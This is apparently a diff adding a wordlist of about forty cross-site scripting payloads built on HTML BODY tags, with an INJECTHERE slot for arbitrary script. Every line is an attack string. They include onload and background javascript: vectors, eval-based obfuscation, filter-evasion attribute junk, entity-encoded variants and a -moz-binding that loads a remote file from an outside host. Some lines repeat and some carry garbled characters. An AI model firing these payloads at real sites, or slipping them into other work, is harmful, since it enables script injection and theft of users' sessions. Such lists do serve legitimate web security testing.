@@ -1,0 +1,40 @@
+<BODY BACKGROUND="javascript:alert('XSS');">
+<BODY ONLOAD=alert(INJECTHERE)>
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(INJECTHERE);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(INJECTHERE);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(INJECTHERE);;;;
+<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert("XSS")>
+<body onload=;;;;;;;;;;;_=alert;_(INJECTHERE);;;;
+<body <body onload=;;;;;al:eval('al'+'ert(INJECTHERE)');;>
+<body/s/onload=x={doc:parent.document};x.doc.writeln(INJECTHERE)
+<body/â€â€$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(INJECTHERE)
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+<STYLE type="text/css">BODY{background:url("javascript:alert(INJECTHERE)")}</STYLE>
+HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert(INJECTHERE)</SCRIPT>"> </BODY></HTML>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(INJECTHERE)>
+<BODY BACKGROUND="javascript:alert(INJECTHERE)">
+<BODY ONLOAD=alert(INJECTHERE)>
+<STYLE type="text/css">BODY{background:url("javascript:alert(INJECTHERE)")}</STYLE>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(INJECTHERE)>
+<BODY BACKGROUND="javascript:alert(INJECTHERE)">
+<STYLE type="text/css">BODY{background:url("javascript:alert(INJECTHERE)")}</STYLE>
+<body/onload=&lt;!--&gt;&#10alert(INJECTHERE)>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(INJECTHERE)>'
+<body/onload=&lt;!--&gt;&#10alert(INJECTHERE)>
+<BODY BACKGROUND=�javascript:alert(INJECTHERE)�>
+<BODY ONLOAD=alert(INJECTHERE)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onscroll=alert(INJECTHERE)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+&lt;BODY BACKGROUND=\"javascript&#058;alert(INJECTHERE)\"&gt;
+&lt;BODY ONLOAD=alert(INJECTHERE)&gt;
+&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert(INJECTHERE)\")}&lt;/STYLE&gt;
+&lt;HTML&gt;&lt;BODY&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(INJECTHERE)&gt;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(INJECTHERE)>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(INJECTHERE)>
+<BODY BACKGROUND="javascript:alert(INJECTHERE)">
+<body background=javascript:'"><script>alert(INJECTHERE)</script>></body>
+<body background=javascript:'"><script>alert(INJECTHERE)</script>></body>
